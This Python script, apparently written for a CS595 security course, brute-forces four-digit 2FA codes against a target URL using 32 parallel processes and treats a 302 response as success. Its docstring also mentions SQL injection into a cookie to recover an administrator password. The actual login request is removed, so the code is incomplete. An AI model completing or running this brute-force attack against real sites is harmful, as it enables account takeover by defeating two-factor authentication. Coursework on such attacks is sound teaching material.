import sys
import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool, Value
from functools import partial
from math import floor, ceil

""" Ben Totten
    Originally a part of a Binary Search using regex to find administrator password using sql injection into a cookie
    Args:
        site (str): URL to test;
    Expected:
        Origingally intended to prints valid 2FA token
"""

# Globals
if(len(sys.argv) > 1):
    site = sys.argv[1]

thread_count = 32   # Number of threads you want to run on
s = requests.Session()
tracker = Value('i', 0)


def main():
  # Allocate number range to check based on number of threads used
  intervals = allocate_boundaries()
  
  # Set up and initiate threading pool
  thread_it = partial(brute_2FA, intervals=intervals, login2_url=site)
  
  # Launch process on threads
  with Pool(thread_count) as p:
    returned_codes = p.map(thread_it, intervals['start'])

    
def allocate_boundaries():
    """ Creates start and stop boundary arrays for brute force threading function
    Global Args:
        threads (number): number of threads to utilize
    Returns:
        string: object containing array of start and stop times
    """
    start_interval = ceil(9999 / thread_count)
    intervals = {'start': ['0'], 'stop': []}
    i = 0

    while (i < 10000):
        i = (i+start_interval)
        if(i < 10000):
            intervals['start'].append(i)
            intervals['stop'].append(i-1)
    intervals['stop'].append('9999')
    return intervals


def brute_2FA(start, intervals, login2_url):
    """Records timing data for an individual attack
    Args:
        start (string): number to initate brute force at
        stop (string): number to stop brute force at
        login2_url (string): url to try 2FA at
        *Optional csrf (string): **This has been removed to ensure integrity of future CS595 homework assignments
    Returns:
        string: response code of either success or failure of last tried number
    """

    """ Check if value found by another process
    """

    for i in range(len(intervals['start'])):
        if(intervals['start'][i] == start):
            print('Initiating...')
            stop = int(intervals['stop'][i])
            print(f'Start {str(start)} end {str(stop)}')
            break

    for i in range(int(start), int(stop)+1):
        if(tracker.value == 1):
            return 'skipped'
        
        # Thank you https://www.geeksforgeeks.org/python-program-to-convert-a-list-to-string/
        code = ''.join([str(elem) for elem in create_code(i)])
        
        # Insert Login Function here
        # **This function has been removed to ensure integrity of future CS595 homework assignments**
        
        if resp.status_code == 302:
            print(f'[{code}] 2fa valid with response code {resp.status_code}')
            tracker.value = 1
            return 'Code: ' + code
    return '-'


def create_code(start):
    """Makes 4 digit array out of number
    Args:
        start (number): number to convert
    Returns:
        string: four digit array of number
    """
    code = ['x'] * 4
    count = 0

    start_string = str(start)
    length = len(start_string)
    start_array = []
    for i in range(length):
        start_array.append(start_string[i])

    for i in range(length):
        code.insert(i, start_array[i])
        code.pop()

    for i in range(4):
        if code[i] == 'x':
            code.pop()
            code.insert(0, '0')
    return code



if __name__ == "__main__":
    main()

